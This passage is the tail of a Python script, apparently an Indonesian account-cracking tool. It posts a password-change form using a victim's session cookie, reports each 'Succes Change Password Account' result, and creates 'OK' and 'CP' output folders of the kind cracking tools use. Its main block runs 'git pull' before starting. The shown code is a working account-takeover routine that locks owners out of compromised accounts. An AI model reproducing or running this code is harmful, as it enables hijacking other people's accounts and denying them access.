                         'password_confirm':password_new,
                         'save':'Simpan perubahan'
                     }
                     find = parse(link.text,'html.parser').find('form',method='post')['action']
                     posh = ses.post(f'https://{url}' + find, data=data, cookies = {'cookie':coki})
                     if 'Kata Sandi Telah Diubah' in posh.text:
                          print('\r %s*  [ ✓ ] Succes Change Password Account : %s To %s'%(H,user,password_new))
                     else:
                          print('\r %s*  [ X ] Failed Change Password Account : %s To %s'%(M,user,password_new))
             except Exception as e:print('\r %s*  [ X ] Failed Change Password Account : %s'%(M,user))

def folder():
    try:os.mkdir('OK')
    except:pass
    try:os.mkdir('CP')
    except:pass
if __name__ == "__main__":
	os.system('git pull')
	folder()
	main()
